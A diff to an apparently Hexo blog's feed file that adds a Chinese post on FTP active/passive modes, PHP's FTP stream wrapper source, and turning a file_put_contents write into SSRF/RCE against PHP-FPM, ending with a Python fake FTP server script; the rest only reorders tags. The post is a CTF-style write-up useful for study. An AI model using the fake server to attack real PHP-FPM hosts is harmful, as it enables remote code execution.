@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>从FTP到PHP-FPM</title>
+    <link href="/2021/03/02/%E4%BB%8EFTP%E5%88%B0PHP-FPM/"/>
+    <url>/2021/03/02/%E4%BB%8EFTP%E5%88%B0PHP-FPM/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 猛的，有趣的。</p><a id="more"></a><hr><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>文件传输协议，其中服务端用于存储文件，客户端可以通过该协议访问服务端上的资源，可以进行文件上传和文件下载操作。</p><p>FTP的工作模式有两种，其中一种为主动（Port）模式，在该模式下，客户端首先连接服务端的21端口，完成认证后自身打开并监听一个端口，再将端口号告知服务端，最后由服务端连接客户端的该端口并传输文件。因为主动模式下需要由服务端主动连接客户端，所以会因为客户端的防火墙等措施出现阻塞的情况。</p><p>另一种为被动（Passive）模式，在该模式下，客户端同样首先连接服务端的21端口，此时客户端会提交一个PASV命令，代表进入被动模式，然后服务端监听一个端口，再将端口号告知客户端，由客户端连接服务端的该端口进行文件传输。</p><p>而由于主动模式存在各种隐患，FTP客户端一般选择使用被动模式进行交互。</p><p>用docker搭建一个FTP服务（使用的镜像为fauria/vsftpd），然后简单用FTP客户端上传一个文件，抓个包看看：</p><p><img src="/css/images/ftp_ssrf/2021030201.png" srcset="/img/loading.gif" alt=""></p><p>可以看出，客户端完成认证之后，将传输模式设置为Binary，然后发送了一条PORT命令，将自身监听的端口以149,83的形式告知服务端。服务端计算149*256+83=38227得出端口，用自身的20端口和客户端的该端口建立连接后，客户端就将文件内容传输至服务端，并保存在指定目录下。</p><p>观察流量包可以发现，在客户端发送完PORT命令后，服务端的相应为：</p><pre><code>Response: 200 PORT command successful. Consider using PASV.</code></pre><p>结合流量包交互流程，我们可以发现，此次文件传输使用的是FTP的主动模式。</p><p>观察文件传输数据包：</p><p><img src="/css/images/ftp_ssrf/2021030202.png" srcset="/img/loading.gif" alt=""></p><p>可以发现，20和38227端口之间的数据交互内容就是上传的文件内容。</p><p>接下来尝试使用被动模式，使用PASV命令进入被动模式并抓包：</p><p><img src="/css/images/ftp_ssrf/2021030203.png" srcset="/img/loading.gif" alt=""></p><p>大致的流程相同，只不过开启端口的是服务端，开启的端口也由服务端告知客户端。除此之外，文件传输使用的是一个TCP包，文件内容被放置在TCP包的数据部分。</p><p>很明显，在一次客户端通过FTP协议上传文件的过程中，如果我们可以控制其上传文件的目的地，以及上传文件内容，我们就可以通过伪造FTP服务端的方式，让客户端向一个特定地方发送一个可控的TCP包，实现一次自由度相当高的SSRF攻击。</p><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>我们都知道，当PHP运行在FPM模式下时，一次请求是由Nginx作为代理，通过FastCGI协议与PHP进行交互来实现的。此时PHP就是一个独立的服务，可以通过SSRF的方式进行访问，满足条件时甚至可以实现RCE。</p><p>而PHP中的file_put_contents函数，<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">底层支持FTP协议</a>，所以在PHP运行在FPM模式的情况下，可以将一个文件写漏洞转换为一个RCE漏洞（前提是写文件路径可控，且内容完全可控）。</p><p>先来看看PHP的file_put_contents函数对FTP协议的实现，找到ftp_fopen_wrapper.c里的php_stream_url_wrap_ftp函数：</p><pre><code class="c">stream = php_ftp_fopen_connect(wrapper, path, mode, options, opened_path, context, &amp;reuseid, &amp;resource, &amp;use_ssl, &amp;use_ssl_on_data);if (!stream) {    goto errexit;}</code></pre><p>进入php_ftp_fopen_connect函数开始连接服务端：</p><pre><code class="c">/* Start talking to ftp server */result = GET_FTP_RESULT(stream);if (result &gt; 299 || result &lt; 200) {    php_stream_notify_error(context, PHP_STREAM_NOTIFY_FAILURE, tmp_line, result);    goto connect_errexit;}</code></pre><p>开始建立连接，要求第一个响应码在200-299之间，相当于一个Hello招呼，也就是流量包里的：</p><p><img src="/css/images/ftp_ssrf/2021030204.png" srcset="/img/loading.gif" alt=""></p><p>继续看代码：</p><pre><code class="c">/* send the user name */if (resource-&gt;user != NULL) {    ZSTR_LEN(resource-&gt;user) = php_raw_url_decode(ZSTR_VAL(resource-&gt;user), ZSTR_LEN(resource-&gt;user));    PHP_FTP_CNTRL_CHK(ZSTR_VAL(resource-&gt;user), ZSTR_LEN(resource-&gt;user), &quot;Invalid login %s&quot;)        php_stream_printf(stream, &quot;USER %s\r\n&quot;, ZSTR_VAL(resource-&gt;user));} else {    php_stream_write_string(stream, &quot;USER anonymous\r\n&quot;);}</code></pre><p>开始验证登录，首先客户端发送用户名，也就是流量包里的：</p><p><img src="/css/images/ftp_ssrf/2021030205.png" srcset="/img/loading.gif" alt=""></p><p>然后：</p><pre><code class="c">/* if a password is required, send it */if (result &gt;= 300 &amp;&amp; result &lt;= 399) {    php_stream_notify_info(context, PHP_STREAM_NOTIFY_AUTH_REQUIRED, tmp_line, 0);    if (resource-&gt;pass != NULL) {        ZSTR_LEN(resource-&gt;pass) = php_raw_url_decode(ZSTR_VAL(resource-&gt;pass), ZSTR_LEN(resource-&gt;pass));        PHP_FTP_CNTRL_CHK(ZSTR_VAL(resource-&gt;pass), ZSTR_LEN(resource-&gt;pass), &quot;Invalid password %s&quot;)            php_stream_printf(stream, &quot;PASS %s\r\n&quot;, ZSTR_VAL(resource-&gt;pass));    } else {        /* if the user has configured who they are,               send that as the password */        if (FG(from_address)) {            php_stream_printf(stream, &quot;PASS %s\r\n&quot;, FG(from_address));        } else {            php_stream_write_string(stream, &quot;PASS anonymous\r\n&quot;);        }    }    /* read the response */    result = GET_FTP_RESULT(stream);    if (result &gt; 299 || result &lt; 200) {        php_stream_notify_error(context, PHP_STREAM_NOTIFY_AUTH_RESULT, tmp_line, result);    } else {        php_stream_notify_info(context, PHP_STREAM_NOTIFY_AUTH_RESULT, tmp_line, result);    }}if (result &gt; 299 || result &lt; 200) {    goto connect_errexit;}</code></pre><p>然后根据响应确定是否需要输入密码，当响应码为300-399时代表需要输入密码（其后响应码为200-299代表密码正确），200-299代表不需要，也就是流量包中的：</p><p><img src="/css/images/ftp_ssrf/2021030206.png" srcset="/img/loading.gif" alt=""></p><p>这样连接部分就完成了，访问上一个函数：</p><pre><code class="c">/* set the connection to be binary */php_stream_write_string(stream, &quot;TYPE I\r\n&quot;);result = GET_FTP_RESULT(stream);if (result &gt; 299 || result &lt; 200)    goto errexit;.../* set up the passive connection */portno = php_fopen_do_pasv(stream, ip, sizeof(ip), &amp;hoststart);</code></pre><p>将传输模式设置为Binary，然后进入php_fopen_do_pasv函数：</p><pre><code class="c">/* EPSV failed, let&#39;s try PASV */php_stream_write_string(stream, &quot;PASV\r\n&quot;);result = GET_FTP_RESULT(stream);/* make sure we got a 227 response */if (result != 227) {    return 0;}</code></pre><p>将模式切换为被动模式，并确保切换成功，也就是流量包中的：</p><p><img src="/css/images/ftp_ssrf/2021030207.png" srcset="/img/loading.gif" alt=""></p><p>之后就是解析并计算出被动模式下服务端的地址以及监听的端口，并发送文件内容了。</p><p>接下来试试让客户端将命令发送给本地的2333端口，先起一个docker：</p><pre><code class="bash">docker run -id --name ftp -e FTP_PASS=admin -e PASV_ADDRESS=127.0.0.1 -e PASV_MIN_PORT=2333 -e PASV_MAX_PORT=2333 fauria/vsftpd</code></pre><p>然后将FTP切换为被动模式并上传文件，可以看到：</p><p><img src="/css/images/ftp_ssrf/2021030208.png" srcset="/img/loading.gif" alt=""></p><p>虽然客户端连接上了本地的2333端口，但是由于服务端没有告知客户端可以发送文件了，所以流程卡住了，也就是流量包中的这部分没有完成：</p><p><img src="/css/images/ftp_ssrf/2021030209.png" srcset="/img/loading.gif" alt=""></p><p>所以要实现一次攻击，还需要自己实现一个伪造的FTP服务端，详见参考文章，脚本如下：</p><pre><code class="python">import sockethost = &#39;0.0.0.0&#39;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)conn, address = sk.accept()conn.send(&quot;200 \n&quot;)print &#39;200&#39;print conn.recv(20)conn.send(&quot;200 \n&quot;)print &#39;200&#39;print conn.recv(20)conn.send(&quot;200 \n&quot;)print &#39;200&#39;print conn.recv(20)conn.send(&quot;300 \n&quot;)print &#39;300&#39;print conn.recv(20)conn.send(&quot;200 \n&quot;)print &#39;200&#39;print conn.recv(20)print &quot;ck&quot;conn.send(&quot;227 127,0,0,1,8,6952\n&quot;)print &#39;200&#39;print conn.recv(20)conn.send(&quot;150 \n&quot;)print &#39;150&#39;print conn.recv(20)conn.close()exit()</code></pre><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/liyong-blackStone/p/10309749.html" target="_blank" rel="noopener">FTP协议简介</a></p><p><a href="https://www.anquanke.com/post/id/226750" target="_blank" rel="noopener">hxp2020的resonator题解分析</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>php://filter过滤器的奇妙操作</title>
     <link href="/2021/02/19/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%A5%87%E5%A6%99%E6%93%8D%E4%BD%9C/"/>
     <url>/2021/02/19/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%A5%87%E5%A6%99%E6%93%8D%E4%BD%9C/</url>
@@ -1048,9 +1067,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1126,9 +1145,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -1149,9 +1168,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1170,9 +1189,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1191,9 +1210,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1254,9 +1273,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -1277,9 +1296,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1298,9 +1317,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1319,9 +1338,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1340,9 +1359,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1422,9 +1441,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1483,9 +1502,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1506,9 +1525,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1527,9 +1546,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1567,9 +1586,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1588,9 +1607,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1628,9 +1647,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1649,9 +1668,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1853,9 +1872,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
